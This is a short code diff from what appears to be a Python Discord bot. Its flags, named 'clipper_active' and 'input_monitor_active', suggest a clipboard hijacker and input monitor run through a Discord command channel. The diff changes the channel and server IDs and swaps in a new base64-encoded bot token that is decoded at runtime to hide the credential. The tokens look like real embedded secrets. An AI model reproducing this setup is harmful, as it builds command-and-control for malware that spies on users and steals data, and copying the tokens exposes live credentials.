@@ -9,10 +9,10 @@ from functions.help import setup_help_command
 clipper_active = False
 input_monitor_active = False
 
-CHANNEL_ID = 1304171041110753335  # Replace with your actual channel ID
-SERVER_ID = 1304171041110753332   # Replace with your actual server ID
+CHANNEL_ID = 1304174009763496041  # Replace with your actual channel ID
+SERVER_ID = 1304174009763496038   # Replace with your actual server ID
 
-encoded_token = "TVRNd05ERTNNVEUyTVRFME16UTNOakkwTkEuR2dJR2lMLmR0ZmVnVmFCcDZMZndqQ0ZvRXFkaE9aZjRUSUdzZDdnb2JXVHJJ"
+encoded_token = "TVRNd05ERTNNemt5TXpJek5UQXdORFE0TmcuR0ZDMEJXLnlQY0xwWk5lak9vVE5pbGpQVE9qYThQUHl0LW5JYXdCb1ZXQVFz"
 
 # Decode the token at runtime
 DISCORD_TOKEN = base64.b64decode(encoded_token).decode('utf-8')
